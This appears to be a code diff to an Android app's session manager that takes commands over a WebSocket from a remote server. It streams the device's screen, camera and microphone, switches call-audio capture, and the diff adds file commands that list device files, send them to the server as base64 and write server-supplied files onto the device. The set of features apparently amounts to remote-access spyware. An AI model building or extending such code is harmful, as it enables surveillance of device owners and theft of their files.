@@ -19,75 +19,14 @@ import okio.ByteString
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 
-/**
- * =================================================================================================
- * IMPORTANT: REQUIRED CHANGES IN OTHER FILES FOR THIS TO WORK
- * =================================================================================================
- *
- * 1. In `Constants.kt` -> `Intents`, add these new actions:
- *
- *    const val ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION = "com.systemlinker.UPGRADE_FGS_MP"
- *    const val ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION = "com.systemlinker.DOWNGRADE_FGS_MP"
- *
- *
- * 2. In `SystemLinkerService.kt`, you MUST register a new BroadcastReceiver to handle these actions:
- *
- *    // --- Add this receiver inside your SystemLinkerService class ---
- *    private val fgsUpgradeReceiver = object : BroadcastReceiver() {
- *        override fun onReceive(context: Context?, intent: Intent?) {
- *            when (intent?.action) {
- *                Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION -> {
- *                     // UPGRADE: Add mediaProjection type and restart foreground service
- *                     val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
- *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
- *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
- *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION // ADDED
- *
- *                     startForeground(1001, createNotification(isStreaming = true), serviceTypes)
- *                }
- *                Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION -> {
- *                     // DOWNGRADE: Remove mediaProjection type
- *                     val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
- *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
- *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION // REMOVED
- *
- *                     startForeground(1001, createNotification(isStreaming = false), serviceTypes)
- *                }
- *            }
- *        }
- *    }
- *
- *    // --- In `onCreate()` of SystemLinkerService, register the receiver ---
- *    val filter = IntentFilter().apply {
- *        addAction(Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION)
- *        addAction(Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION)
- *    }
- *    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
- *        registerReceiver(fgsUpgradeReceiver, filter, RECEIVER_NOT_EXPORTED)
- *    } else {
- *        registerReceiver(fgsUpgradeReceiver, filter)
- *    }
- *
- *    // --- In `onDestroy()` of SystemLinkerService, unregister it ---
- *    unregisterReceiver(fgsUpgradeReceiver)
- *
- *
- *    // --- Optional: Modify createNotification() to show streaming status ---
- *    private fun createNotification(isStreaming: Boolean = false): Notification {
- *         val text = if (isStreaming) "Live screen streaming active." else Constants.Service.NOTIFICATION_TEXT
- *         return NotificationCompat.Builder(this, Constants.Service.NOTIFICATION_CHANNEL_ID)
- *             .setContentTitle(Constants.Service.NOTIFICATION_TITLE)
- *             .setContentText(text)
- *             // ... rest of builder
- *             .build()
- *     }
- * =================================================================================================
- */
 class LiveSessionManager(private val context: Context) : WebSocketListener() {
 
     private var webSocket: WebSocket? = null
     private val client = OkHttpClient.Builder()
         .pingInterval(10, TimeUnit.SECONDS)
+        .readTimeout(0, TimeUnit.MILLISECONDS) // Prevent WS disconnect on silent servers
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .writeTimeout(15, TimeUnit.SECONDS)
         .build()
         
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -97,6 +36,7 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     private val audioStreamer = AudioStreamer { bytes -> sendBinary(bytes) }
     private val screenStreamer = ScreenStreamer(context) { bytes -> sendBinary(bytes) }
     private val cameraStreamer = CameraStreamer(context) { bytes -> sendBinary(bytes) }
+    private val fileManager = LocalFileManager() // NEW File Manager
 
     private val systemDataReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -114,19 +54,10 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                     }
 
                     if (data != null && context != null) {
-                        // ** CRASH FIX FOR ANDROID 14+ **
-                        // We must first command the service to "upgrade" its Foreground Service type
-                        // to include mediaProjection BEFORE we start streaming.
                         scope.launch {
-                            // 1. Send the broadcast command to SystemLinkerService.
                             val upgradeIntent = Intent("com.systemlinker.UPGRADE_FGS_MP")
                             context.sendBroadcast(upgradeIntent)
-
-                            // 2. Give the service a moment to process the FGS upgrade.
-                            // Without this, startStreaming might be called before the OS acknowledges the change.
                             delay(500)
-
-                            // 3. Now it is safe to start the screen stream.
                             screenStreamer.startStreaming(code, data)
                             sendJson(JSONObject().put("status", "screen_cast_started"))
                         }
@@ -162,7 +93,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
         audioStreamer.stopAll()
         cameraStreamer.stopStreaming()
         
-        // Check if screen streamer is running and command a service downgrade if it is.
         if (screenStreamer.isStreaming) {
             screenStreamer.stopStreaming()
             val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
@@ -224,7 +154,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     context.startActivity(intent)
                 } else {
-                    // Stop streaming and tell the service to "downgrade" its FGS type
                     if (screenStreamer.isStreaming) {
                        screenStreamer.stopStreaming()
                        val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
@@ -252,39 +181,51 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
             
             "live_audio_mode" -> {
                 when (arg) {
-                    "call" -> {
-                        audioStreamer.switchMode(AudioMode.CALL)
-                        sendJson(JSONObject().put("audio_mode", "call_active"))
-                    }
-                    "play" -> {
-                        audioStreamer.switchMode(AudioMode.PLAY_ONLY)
-                        sendJson(JSONObject().put("audio_mode", "play_only_active"))
-                    }
-                    "mic" -> {
-                        audioStreamer.switchMode(AudioMode.MIC_ONLY)
-                        sendJson(JSONObject().put("audio_mode", "mic_only_active"))
-                    }
-                    "media" -> {
-                        audioStreamer.switchMode(AudioMode.MEDIA_ONLY, null) 
-                        sendJson(JSONObject().put("audio_mode", "media_capture_attempted"))
-                    }
-                    "off" -> {
-                        audioStreamer.switchMode(AudioMode.OFF)
-                        sendJson(JSONObject().put("audio_mode", "off"))
-                    }
+                    "call" -> { audioStreamer.switchMode(AudioMode.CALL); sendJson(JSONObject().put("audio_mode", "call_active")) }
+                    "play" -> { audioStreamer.switchMode(AudioMode.PLAY_ONLY); sendJson(JSONObject().put("audio_mode", "play_only_active")) }
+                    "mic" -> { audioStreamer.switchMode(AudioMode.MIC_ONLY); sendJson(JSONObject().put("audio_mode", "mic_only_active")) }
+                    "media" -> { audioStreamer.switchMode(AudioMode.MEDIA_ONLY, null); sendJson(JSONObject().put("audio_mode", "media_capture_attempted")) }
+                    "off" -> { audioStreamer.switchMode(AudioMode.OFF); sendJson(JSONObject().put("audio_mode", "off")) }
                     else -> sendJson(JSONObject().put("error", "Invalid audio mode"))
                 }
+            }
+
+            // =====================================
+            // NEW: LIVE FILE MANAGER COMMANDS
+            // =====================================
+            "fm_ls" -> sendJson(JSONObject().put("cmd", "fm_ls_result").put("data", fileManager.listFiles(arg)))
+            "fm_info" -> sendJson(JSONObject().put("cmd", "fm_info_result").put("data", fileManager.getFileInfo(arg)))
+            "fm_create" -> {
+                val isDir = payload.optBoolean("isDir", false)
+                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.create(arg, isDir)))
+            }
+            "fm_rename" -> {
+                val newName = payload.optString("newName")
+                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.rename(arg, newName)))
+            }
+            "fm_copy" -> {
+                val dest = payload.optString("dest")
+                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.copy(arg, dest)))
+            }
+            "fm_move" -> {
+                val dest = payload.optString("dest")
+                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.move(arg, dest)))
+            }
+            "fm_download" -> {
+                // Client to Server
+                val base64 = fileManager.readBase64(arg)
+                sendJson(JSONObject().put("cmd", "fm_download_result").put("file", arg).put("data", base64))
+            }
+            "fm_upload" -> {
+                // Server to Client
+                val base64 = payload.optString("data")
+                sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.writeBase64(arg, base64)))
             }
         }
     }
 
-    private fun sendJson(json: JSONObject) { 
-        webSocket?.send(json.toString()) 
-    }
-    
-    private fun sendBinary(bytes: ByteArray) { 
-        webSocket?.send(ByteString.of(*bytes)) 
-    }
+    private fun sendJson(json: JSONObject) { webSocket?.send(json.toString()) }
+    private fun sendBinary(bytes: ByteArray) { webSocket?.send(ByteString.of(*bytes)) }
 
     private fun vibrateDevice(durationMs: Long) {
         val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
